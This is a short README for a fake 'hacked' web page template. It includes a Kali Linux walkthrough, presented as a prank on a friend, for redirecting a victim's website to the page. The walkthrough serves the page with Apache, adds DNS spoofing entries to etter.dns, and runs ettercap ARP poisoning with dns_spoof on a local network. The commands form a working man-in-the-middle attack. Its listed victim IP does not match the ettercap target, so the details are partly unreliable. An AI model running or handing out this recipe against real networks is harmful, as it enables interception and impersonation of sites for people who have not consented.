## Hacked page template.


[How it looks](https://tarokinoe.github.io/hacked_page/)

### Kali usage example:
Let's say you want to make a joke with your friend and "hack" his web-site.  
We wil use [Kali linux](https://www.kali.org/).
- 192.168.0.1 - gateway  
- 192.168.0.20 - victim  
- 192.168.0.30 - your ip  
- example.com - victim's site domain name

```
cd /var/www/html/
rm index.html
git clone https://github.com/tarokinoe/hacked_page.git .
service apache2 start
```
/etc/ettercap/etter.dns
```
...
example.com A 192.168.0.30
*.example.com A 192.168.0.30
www.example.com PTR 192.168.0.30
...
```
```
ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof /192.168.0.1// /192.168.0.30//
```
